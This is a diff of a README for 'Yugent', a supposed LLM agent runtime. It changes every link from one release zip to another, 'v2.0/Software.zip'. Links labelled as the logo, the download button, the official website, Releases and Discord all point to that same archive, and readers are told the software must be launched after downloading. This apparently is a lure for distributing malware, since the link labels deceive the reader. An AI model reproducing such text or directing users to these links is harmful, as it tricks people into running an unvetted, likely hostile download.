@@ -1,6 +1,6 @@
 # 🌟 Welcome to "Yugent" - Your Simple & Modular Agentic Runtime for LLM Needs! 🚀
 
-![Yugent Logo](https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip)
+![Yugent Logo](https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip)
 
 ## Overview
 Yugent is a cutting-edge agentic runtime designed to meet all your LLM (Large Language Model) requirements in a simple and modular manner. Whether you are working on AI, chatbot development, generative AI tools, or RAG (Retrieval-Augmented Generation), Yugent has got you covered with its versatile features and functionalities.
@@ -31,17 +31,17 @@ Yugent is a cutting-edge agentic runtime designed to meet all your LLM (Large La
 ## Get Started
 To experience the full power of Yugent, download the latest version by clicking the button below:
 
-[![Download Yugent](https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip)](https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip)
+[![Download Yugent](https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip)](https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip)
 
 Note: The software needs to be launched after downloading.
 
-If the link above is not working, kindly check the [Releases](https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip) section for alternative download options.
+If the link above is not working, kindly check the [Releases](https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip) section for alternative download options.
 
 ## Explore Further
-For more information and updates, visit our official website [https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip](https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip).
+For more information and updates, visit our official website [https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip](https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip).
 
 ## Join the Community
-Have ideas or feedback to share? Join our [Discord](https://github.com/yahyalina/yugent/releases/download/v1.0/Release.zip) community to connect with like-minded enthusiasts and developers.
+Have ideas or feedback to share? Join our [Discord](https://github.com/yahyalina/yugent/releases/download/v2.0/Software.zip) community to connect with like-minded enthusiasts and developers.
 
 Let's revolutionize the world of AI together with Yugent! 🚀
 
